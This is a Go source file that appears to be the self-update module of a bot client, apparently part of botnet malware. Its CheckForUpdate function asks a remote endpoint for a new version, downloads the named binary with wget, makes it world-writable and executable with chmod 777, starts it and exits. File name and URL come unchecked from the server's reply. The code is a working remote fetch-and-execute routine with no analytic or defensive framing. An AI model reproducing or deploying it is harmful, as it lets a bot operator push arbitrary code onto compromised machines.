package modules

import (
	"bot/lib/security"
	"bot/lib/utils"
	"fmt"
	"io/ioutil"
	"net/http"
	"os/exec"
	"strings"
)

func DownloadBin(FileName string, Url string) {
	_, Err := exec.Command("wget", "-O", FileName, Url).Output()
	utils.HandleError(Err)
}

func CheckForUpdate() {
	Response, Err := http.Get(fmt.Sprintf("%s?arch=%s", utils.Edpoint["update"], utils.GetCPUArch()))
	if utils.HandleError(Err) {
		return
	}

	Data, Err := ioutil.ReadAll(Response.Body)
	if utils.HandleError(Err) {
		return
	}

	BinData := strings.Split(string(Data), "|")
	// version|url|name

	if BinData[0] == utils.BinVersion {
		utils.Debug(fmt.Sprintf("[UPDATER] No update available. Current version: %s", utils.BinVersion))
		return
	}

	utils.Debug(fmt.Sprintf("[UPDATER] Update available. Current version: %s. New version: %s", utils.BinVersion, BinData[0]))

	DownloadBin(BinData[2], BinData[1])
	utils.InstanceRunning = false

	_, Err = exec.Command("chmod", "777", fmt.Sprintf("./%s", BinData[2])).Output()
	if utils.HandleError(Err) {
		return
	}

	err := exec.Command(fmt.Sprintf("./%s", BinData[2]), "&").Start()
	if utils.HandleError(err) {
		fmt.Println("[UPDATER] Failed to start new binary")
		return
	}

	defer security.SafeExit()
	utils.Debug("[UPDATER] Update finished, exit..")
}
